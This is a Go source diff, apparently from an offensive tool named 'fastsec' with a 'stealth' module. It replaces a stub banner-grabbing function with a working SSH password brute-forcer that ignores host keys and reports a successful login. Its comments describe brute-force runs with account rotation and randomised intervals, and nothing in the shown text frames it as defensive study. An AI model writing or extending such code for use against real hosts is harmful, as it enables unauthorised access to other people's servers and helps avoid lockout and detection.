@@ -6,12 +6,12 @@ import (
 	"fmt"
 	"io"
 	"math/rand"
-	"net"
 	"net/http"
 	"net/url"
 	"strings"
-	"sync"
 	"time"
+
+	"golang.org/x/crypto/ssh"
 
 	"fastsec/internal/stealth"
 )
@@ -97,23 +97,21 @@ func (c *Config) tryHTTPForm(user, pass string, cli *stealth.Client) bool {
 	return resp.StatusCode == 200
 }
 
-// tryTCPBanner: TCP banner 爆破（ssh/smb 等，检查 banner 差异）
+// tryTCPBanner: TCP 爆破——SSH 密码认证（真实实现，x/crypto/ssh）
 func (c *Config) tryTCPBanner(user, pass string) bool {
-	// 简化：TCP 连接测试（真实协议爆破需协议库，这里做 banner 收集）
-	conn, err := net.DialTimeout("tcp", c.Target, c.Timeout)
+	// SSH 密码认证：能建立会话 = 密码正确
+	config := &ssh.ClientConfig{
+		User:            user,
+		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // 内网目标自签
+		Timeout:         c.Timeout,
+	}
+	conn, err := ssh.Dial("tcp", c.Target, config)
 	if err != nil {
 		return false
 	}
 	defer conn.Close()
-	// 读 banner
-	buf := make([]byte, 512)
-	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
-	n, _ := conn.Read(buf)
-	_ = n
-	// banner 收集后返回 false（真实命中判定由上层协议处理）
-	_ = user
-	_ = pass
-	return false
+	return true // 能连接 = 认证成功
 }
 
 // Run: 执行爆破（多账号轮换 + 随机间隔 + 每账号限次）
@@ -160,4 +158,3 @@ func Format(r Result) string {
 	return sb.String()
 }
 
-var _ = sync.Mutex{}
